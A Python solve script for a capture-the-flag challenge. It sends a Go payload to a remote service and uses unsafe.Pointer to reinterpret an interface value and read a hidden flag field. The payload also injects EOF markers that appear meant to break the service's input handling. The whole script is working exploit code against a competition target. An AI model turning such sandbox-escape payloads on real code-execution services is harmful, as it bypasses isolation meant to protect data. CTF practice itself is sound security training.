#!/usr/bin/env python3
import re
import socket

HOST = "chal.thjcc.org"
PORT = 9000

PAYLOAD = """type catInterface struct {
\tt uintptr
\tv unsafe.Pointer
}

p := unsafe.Pointer(&target)

iface := (*catInterface)(p)

catStr := (*string)(iface.v)

fmt.Println(*catStr)
EOF
fmt.Println(target.(*secret).flag)
_ = unsafe.Sizeof(0)
EOF
"""


def recv_all(sock: socket.socket, timeout: float = 3.0) -> str:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks).decode("utf-8", "ignore")


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        _ = recv_all(sock, timeout=0.6)
        sock.sendall(PAYLOAD.encode())
        out = recv_all(sock, timeout=2.0)

    print(out)
    m = re.search(r"THJCC\{[^}\n]+\}", out)
    if m:
        print(f"[+] Flag: {m.group(0)}")
    else:
        print("[-] Flag not found in output.")


if __name__ == "__main__":
    main()
